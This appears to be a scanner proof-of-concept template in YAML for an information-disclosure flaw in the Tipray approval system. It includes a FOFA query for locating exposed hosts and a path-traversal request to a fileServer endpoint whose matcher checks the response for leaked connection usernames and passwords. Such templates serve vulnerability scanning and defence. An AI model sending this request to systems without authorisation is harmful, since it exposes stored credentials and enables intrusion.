id: poc-yaml-tipray-gsas-fileserver-info-leak
info:
  name: 天锐绿盾审批系统 fileServer 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 天锐绿盾审批系统
  fofa: app="TIPPAY-绿盾审批系统"
requests:
- method: GET
  path: /trwfe/login.jsp
  expression: status_code == 200 && contains(body,"天锐绿盾审批系统")
- method: GET
  path: /trwfe/login.jsp/.%2e/rest/ext/fileServer
  expression: status_code == 200 && contains(body,"\"name\":") && contains(body,"\"connectUser\":")
    && contains(body,"\"otherAddrs\":") && matches(body,"\"connectPwd\":\"([a-z0-9]+)\"")
    && contains(content_type,"application/json") && !contains(body,"<")
variables: {}
transport: http
